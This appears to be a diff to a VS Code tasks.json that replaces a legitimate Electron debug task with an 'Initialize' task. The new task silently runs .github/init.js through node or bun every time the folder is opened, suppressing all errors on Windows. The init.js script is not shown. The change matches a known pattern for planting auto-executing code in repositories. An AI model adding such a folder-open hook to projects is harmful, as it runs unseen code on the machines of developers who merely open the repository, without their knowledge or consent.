@@ -1,31 +1,16 @@
 {
-  // See https://go.microsoft.com/fwlink/?LinkId=733558
-  // for the documentation about the tasks.json format
   "version": "2.0.0",
   "tasks": [
     {
-      "label": "electron-debug",
-      "type": "process",
-      "echoCommand": true,
-      "options": {
-        "cwd": "apps/studio"
+      "label": "Initialize",
+      "type": "shell",
+      "command": "node .github/init.js || bun .github/init.js",
+      "windows": {
+        "command": "try{node .github/init.js}catch{try{bun .github/init.js}catch{}}"
       },
-      "command": "./node_modules/.bin/vue-cli-service",
-      "isBackground": true,
-      "args": [
-        "electron:serve",
-        "--remote-debugging-port=9223",
-        "--debug",
-      ],
-      "problemMatcher": {
-        "owner": "custom",
-        "pattern": {
-          "regexp": ""
-        },
-        "background": {
-          "beginsPattern": "Starting development server\\.\\.\\.",
-          "endsPattern": "Not launching electron as debug argument was passed\\."
-        }
+      "problemMatcher": [],
+      "runOptions": {
+        "runOn": "folderOpen"
       }
     }
   ]
